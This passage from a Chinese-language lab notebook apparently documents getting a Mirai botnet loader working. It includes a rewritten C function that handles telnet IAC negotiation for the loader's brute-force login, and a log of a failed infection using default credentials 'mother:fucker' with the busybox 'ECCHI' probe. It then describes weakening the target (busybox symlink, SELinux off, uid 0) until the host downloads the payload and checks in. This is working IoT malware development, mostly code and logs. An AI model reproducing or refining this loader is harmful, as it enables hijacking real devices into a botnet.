    consumed = connection_consume_iacs(conn);
    if (consumed) // Potential issue
        conn->state_telnet = TELNET_USER_PROMPT;
    break;
```

- 问题点：只要 connection_consume_iacs 消耗了 任何 字节 (consumed > 0)，状态就会立即切换到 TELNET_USER_PROMPT。
- 为什么这是问题：connection_consume_iacs 的设计是循环处理缓冲区中所有连续的 IAC 序列。它可能只消耗了一部分 IAC 序列（例如，如果一个 IAC 命令跨越了多个 recv 调用，或者 can_consume 由于之前的 BUG 错误地返回了 FALSE），然后返回。如果此时缓冲区中还有未处理的 IAC 序列，但状态已经切换到 TELNET_USER_PROMPT，那么 connection_consume_login_prompt 就会尝试将剩余的 IAC 序列误认为登录提示符，这几乎肯定会失败。
- 正确的逻辑应该是：只有当 connection_consume_iacs 消耗了一些字节，并且缓冲区中 不再以 IAC 开头 时，才应该转换状态。或者，connection_consume_iacs 应该有一个返回值或方式来明确指示所有 IAC 都处理完毕了。

connection_consume_iacs 优化：

```md
- 处理循环：
while (remaining_in_buffer > 0): 循环处理，只要当前指针指向的缓冲区段还有数据。
if (current_iac_ptr[0] != TELNET_IAC): 如果当前指针处的字节不是 IAC，则立即 break。这确保了函数只处理从缓冲区开头开始的连续 IAC 序列。
if (remaining_in_buffer < 3): 检查是否有足够的字节进行基本的 IAC CMD OPT 处理。

- 指针和长度管理：
current_iac_ptr: 指向当前正在检查的 IAC 序列的开始。
remaining_in_buffer: current_iac_ptr 之后缓冲区中还剩多少字节。
total_consumed_from_start: 函数最终返回的值，表示从 conn->rdbuf 的最开始总共消耗了多少字节。
```

```c
#include <stdio.h> // For printf
#include <string.h> // For memmove

// 假设 conn->rdbuf, conn->rdbuf_pos, conn->fd 是有效的
// 假设 util_sockprintf 存在或用 send 替代

// 辅助函数：打印缓冲区内容 (用于调试)
void print_buffer_hex(const char *label, const unsigned char *buf, int len) {
    printf("%s (len %d): ", label, len);
    for (int k = 0; k < len; ++k) {
        printf("%02x ", buf[k]);
    }
    printf("\n");
}

int connection_consume_iacs(struct connection *conn) {
    printf("[DEBUG IAC] Entering connection_consume_iacs. rdbuf_pos: %d\n", conn->rdbuf_pos);
    if (conn->rdbuf_pos > 0) {
        print_buffer_hex("[DEBUG IAC] rdbuf on entry", conn->rdbuf, conn->rdbuf_pos);
    }

    int total_consumed_from_start = 0;
    uint8_t *current_iac_ptr = conn->rdbuf; // Always process from the start of the current buffer
    int remaining_in_buffer = conn->rdbuf_pos;

    while (remaining_in_buffer > 0) { // Loop as long as there's data to check at the current_iac_ptr
        if (current_iac_ptr[0] != TELNET_IAC) {
            printf("[DEBUG IAC] Buffer at current offset does not start with IAC. Stopping IAC consumption.\n");
            break; // Not an IAC sequence at the current position, stop.
        }

        // We have an IAC. Check if we have enough for a command and option.
        if (remaining_in_buffer < 3) {
            printf("[DEBUG IAC] Incomplete IAC sequence (need 3 bytes, have %d). Waiting for more data.\n", remaining_in_buffer);
            break; // Not enough data for a full IAC CMD OPT sequence yet
        }

        uint8_t command = current_iac_ptr[1];
        uint8_t option = current_iac_ptr[2];
        unsigned char response[3] = {TELNET_IAC, 0, option};
        BOOL should_send_response = TRUE;
        int bytes_this_iac_command = 3; // Most IAC commands are 3 bytes

        printf("[DEBUG IAC] Processing IAC: %02x %02x %02x\n", current_iac_ptr[0], command, option);

        switch (command) {
            case TELNET_DO:
                response[1] = TELNET_WONT; // Default: WONT
                if (option == TELOPT_NAWS) { // Example: if we wanted to support NAWS
                    // response[1] = TELNET_WILL;
                    // printf("[DEBUG IAC] Server DO NAWS, responding WILL NAWS\n");
                    // Here you might also need to prepare and send an SB NAWS sequence later
                    // For Mirai, WONT is usually fine.
                    printf("[DEBUG IAC] Server DO %02X, responding WONT %02X\n", option, option);
                } else {
                    printf("[DEBUG IAC] Server DO %02X, responding WONT %02X\n", option, option);
                }
                break;

            case TELNET_WILL:
                response[1] = TELNET_DONT;
                printf("[DEBUG IAC] Server WILL %02X, responding DONT %02X\n", option, option);
                break;

            case TELNET_WONT:
            case TELNET_DONT:
                printf("[DEBUG IAC] Server WONT/DONT %02X. No response needed.\n", option);
                should_send_response = FALSE;
                break;

            case TELNET_SB:
                printf("[DEBUG IAC] Server SB %02X. Attempting to find SE.\n", option);
                should_send_response = FALSE; // Response was to the DO/WILL that triggered SB
                int sb_search_len;
                BOOL found_se = FALSE;
                // Start search after IAC SB OPTION (i.e., at current_iac_ptr + 3)
                for (sb_search_len = 3; sb_search_len < remaining_in_buffer -1; ++sb_search_len) { // need at least 2 for IAC SE
                    if (current_iac_ptr[sb_search_len] == TELNET_IAC && current_iac_ptr[sb_search_len + 1] == TELNET_SE) {
                        bytes_this_iac_command = sb_search_len + 2; // Consumes up to and including IAC SE
                        found_se = TRUE;
                        printf("[DEBUG IAC] Found SE. Consuming %d bytes for SB sequence.\n", bytes_this_iac_command);
                        break;
                    }
                }
                if (!found_se) {
                    printf("[DEBUG IAC] Incomplete SB sequence (SE not found). Waiting for more data.\n");
                    // Cannot consume this SB yet, so break the outer while loop.
                    // total_consumed_from_start will be returned as is.
                    goto end_iac_loop; // Exit the while loop, return what's consumed so far.
                }
                break;

            case TELNET_IAC: // IAC IAC (literal 255)
                 // This function's job is to consume TELNET *COMMANDS*.
                 // A literal 0xFF is data. So we should stop here.
                printf("[DEBUG IAC] Encountered IAC IAC. Stopping IAC command consumption.\n");
                goto end_iac_loop; // Exit the while loop

            default:
                printf("[DEBUG IAC] Unknown IAC command: %02X with option %02X. Ignoring.\n", command, option);
                should_send_response = FALSE;
                // We'll consume these 3 bytes to get past it, but this might be risky if it's a 2-byte command.
                // A truly robust parser would know all command lengths or handle errors better.
                // For now, assume 3 to simplify.
                break;
        }

        if (should_send_response) {
            printf("[DEBUG IAC] Sending response: %02x %02x %02x\n", response[0], response[1], response[2]);
            if (send(conn->fd, response, 3, MSG_NOSIGNAL) < 0) {
                perror("[DEBUG IAC] Send error");
                // Handle send error, maybe close connection or return error
                goto end_iac_loop; // Stop processing on send error
            }
        }

        current_iac_ptr += bytes_this_iac_command;
        remaining_in_buffer -= bytes_this_iac_command;
        total_consumed_from_start += bytes_this_iac_command;

        printf("[DEBUG IAC] Consumed %d bytes for this command. Total consumed so far: %d. Remaining in buffer: %d\n",
               bytes_this_iac_command, total_consumed_from_start, remaining_in_buffer);

    } // end while (remaining_in_buffer > 0)

end_iac_loop:
    printf("[DEBUG IAC] Exiting connection_consume_iacs. Total bytes consumed from start of buffer: %d\n", total_consumed_from_start);
    return total_consumed_from_start;
}
```

#### loader 感染错误

报错变为：`ERR|192.168.59.129:23 mother:fucker |7`

```bash
TELOUT: /bin/busybox ECCHI
TELIN: sh: /bin/busybox: No such file or directory
```

这里需要修改目标靶机环境，进行安全降级

- busybox 的位置和预期不符，加个软链接

```bash
bash-5.2$ which busybox
/usr/bin/busybox
bash-5.2$ ln -s /usr/bin/busybox /bin/busybox
```

- 关闭 selinux
- 把 mother 账号的 uid 改为 0

重新尝试，http-server 收到了下载请求：
![Pasted image 20250512221937.png](./Pasted%20image%2020250512221937.png)

即可成功上线
![Pasted image 20250512221446.png](./Pasted%20image%2020250517181007.png)
